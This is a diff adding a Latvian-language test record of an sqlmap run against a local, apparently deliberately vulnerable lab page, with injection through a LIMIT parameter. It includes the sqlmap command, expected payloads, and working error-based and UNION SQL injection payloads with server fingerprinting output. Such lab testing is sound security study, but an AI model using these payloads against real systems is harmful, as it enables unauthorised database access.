@@ -1,0 +1,32 @@
+=================================================================================
+1. Īpašība: tiek injicēts “LIMIT” klauzulā 
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: -
+3.2. error-based: ?limit=3 '
+3.3. time-based: -
+3.4. union: ?limit= 3 union select 1,2,3
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 14622900 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://localhost:8081/sqlinjection/example5/?limit=3" -p limit --risk=3 --level=5
+
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. GET parameter 'limit' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 2265 HTTP(s) requests:
+---
+Parameter: limit (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)
+    Payload: limit=3 PROCEDURE ANALYSE(EXTRACTVALUE(9360,CONCAT(0x5c,0x7170706a71,(SELECT (CASE WHEN (9360=9360) THEN 1 ELSE 0 END)),0x71717a7871)),1)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: limit=3 UNION ALL SELECT CONCAT(0x7170706a71,0x446f43576a57586363476f796d6f717a714259537950714b654e614a727453726c736d4f64447654,0x71717a7871),NULL,NULL-- -
+---
+web server operating system: Linux Debian 6 (squeeze)
+web application technology: Apache 2.2.16
+back-end DBMS: MySQL >= 5.1
